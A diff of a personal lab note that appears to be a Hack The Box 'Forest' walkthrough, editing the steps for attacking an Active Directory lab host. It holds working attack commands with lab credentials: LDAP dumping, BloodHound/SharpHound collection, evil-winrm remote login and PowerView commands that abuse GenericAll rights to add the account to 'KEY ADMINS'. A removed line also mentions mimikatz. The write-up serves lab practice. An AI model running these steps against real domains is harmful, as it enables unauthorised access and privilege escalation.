@@ -93,13 +93,6 @@ ldapdomaindump ldap://htb.local -u "htb.local\svc-alfresco" -p s3rvice
 >![[Pasted image 20250312154052.png]]
 
 We have 2 computers: `EXCH01.htb.local | FOREST.htb.local`
-
-- we can use [[bloodhaunt]] to get a better view
-```bash
-bloodhound-python -d htb.local -u 'svc-alfresco' -p 's3rvice' -c ALL -ns 10.10.10.161 --dns-tcp
-```
->[!example]- Result
->![[Pasted image 20250312164524.png]]
 # Getting Access
 - We can use [[evil-winrm]] to get access (because we are in the "remote management group")
 
@@ -115,14 +108,24 @@ evil-winrm -p 's3rvice' -u 'svc-alfresco' -i 10.10.10.161
 >![[Pasted image 20250312231844.png]]
 >![[Pasted image 20250312231846.png]]
 
-- So we have to dump the credentials using other methods like [[mimikatz]]
+- we can use [[bloodhaunt]] to get a better view
 ```bash
-locate mimikatz.exe
+.\SharpHound.exe -c ALL
 ```
 >[!example]- Result
->![[Pasted image 20250312232203.png]]
+>![[Pasted image 20250313001403.png]]
+>![[Pasted image 20250313000810.png]]
 
-- Upload and execute
+>[!warning] I recommed to use SharpHound.exe last version, becasuse [[bloodhaund-python]] didn't report me the correct path
+
+- we can abuse "GenericALL", [info](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html#genericall-rights-on-group) get into 'KEY ADMINS' group, there are 2 ways, using `net.exe` (not recomended way) or using [[PowerView]] (recomended way)
 ```bash
+. .\PowerView.ps1
 
+Add-DomainGroupMember -Identity 'KEY ADMINS' -Members svc-alfresco
+
+Get-DomainGroupMember -Identity 'KEY ADMINS'
 ```
+>[!example]- Result
+>![[Pasted image 20250313004249.png]]
+
